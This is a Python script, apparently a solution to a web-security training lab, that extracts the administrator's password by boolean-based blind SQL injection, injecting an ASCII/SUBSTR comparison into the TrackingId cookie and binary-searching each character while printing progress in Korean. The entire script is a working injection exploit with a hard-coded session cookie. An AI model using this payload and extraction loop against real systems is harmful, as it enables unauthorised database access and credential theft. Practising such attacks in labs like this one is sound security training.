import requests

url = "https://0a2e00480362901e82a8a1e200c800f5.web-security-academy.net/"
password = ""

print("블라인드 SQL 인젝션")

for i in range(1, 21):
    low = 32
    high = 126
    
    while low <= high:
        mid = (low + high) // 2
        
        cookies = {
            'TrackingId': f"upDw8nyyTKJ83VL6' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1)) > {mid}--", 
            "session" : "i3uUR84N55IJNu9megVjCYhz4gt9Xc8e"
        }
        res = requests.get(url, cookies=cookies)

        
        
        if "Welcome" in res.text: 
            low = mid + 1
        
        else:
            high = mid - 1
            
    
    password += chr(low)
    print(f"실시간으로 찾는 중... 현재까지 패스워드: {password}")
